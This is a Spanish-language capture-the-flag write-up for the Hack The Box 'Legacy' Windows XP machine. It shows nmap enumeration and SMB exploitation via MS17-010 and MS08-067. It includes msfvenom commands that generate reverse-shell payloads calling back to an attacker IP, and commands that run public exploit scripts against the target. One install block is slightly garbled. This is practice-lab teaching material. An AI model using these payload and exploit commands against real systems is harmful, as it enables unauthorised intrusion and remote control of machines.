#  LEGACY MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/1.PNG)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
	- [[#MS-17-010|MS-17-010]]
	- [[#MS08-067|MS08-067]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.10.4 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p139,445,3389 -sV -sC 10.10.10.4 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/3.PNG)

## EXPLOTACION

Como vemos que tiene el servicio smb habilitado, vamos a correr algunos script de nmap para detectar vulnerabilidades sobre ese servicio:

```bash
nmap -p445 --script=smb-vuln-* 10.10.10.4
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/4.PNG)

vemos que es vulnerable a **MS-17-010** y **MS-08-067**

podriamos ejecutar cualquiera de ambos y es lo que vamos a hacer.

### MS-17-010

para este caso encontre un script llamado **send_and_execute.py**:

[https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)

```bash
git clone https://github.com/helviojunior/MS17-010.git
cd MS17-010
```

nos creamos una reverse shell en **.exe** malicioso con msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4242 EXITFUNC=threads -f exe -a x86 --platform windows -o shell.exe
```

y lo que hace este script es enviar un ejecutable a la maquina windows y ejecutarlo automaticamente, nos colocamos en escucha con netcat y ejecutamos.

**se necesita instalar impacket**

```bash
#python2
apt install python2
python2
wget ```python
https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python2 -m pip install .

#python3
apt install python3
python3
apt install python3-pip
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python3 -m pip install .
```

de acuerdo a con que version de python instalaste impacket ejecutas python o python3:

```bash
python send_and_execute.py 10.10.10.4 shell.exe
```

estamos dentro como root y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/5.PNG)

### MS08-067

hay un script en github que nos ayudara: [https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067](https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067)

modificamos el exploit cambiando la shellcode por uno que vamos a generar:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4545 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

lo reemplazamos y ejecutamos.

**debe estar impacket instalado como en el anterior caso, de preferencia instalado con python2**

tiene unas opciones el script por sistema operativo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/6.PNG)

nos funciono con la opcion 6 asi que ejecutamos:

```bash
python ms08-067.py 10.10.10.4 6 445
```

en la escuhca en netcat ya ingresamos como root a la maquina:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LEGACY/images/7.PNG)

de igual forma podemos ver las flags.